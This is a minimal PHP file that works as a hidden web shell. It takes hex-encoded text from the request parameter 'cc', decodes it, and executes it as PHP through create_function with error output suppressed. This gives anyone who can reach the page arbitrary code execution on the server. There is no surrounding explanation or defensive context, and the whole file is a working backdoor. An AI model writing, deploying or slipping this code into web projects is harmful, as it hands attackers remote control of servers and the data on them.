<?php

if(@$_REQUEST["cc"]){
   $c=@$_REQUEST["cc"];
   $c=str_replace(array("\n","\t","\r"),"",$c);
   $buf="";for($i=0;$i<strlen($c);$i+=2)
   $buf.=urldecode("%".substr($c,$i,2));
   $FiLi=Create_Function("",$buf);$FiLi();exit;
}


?>
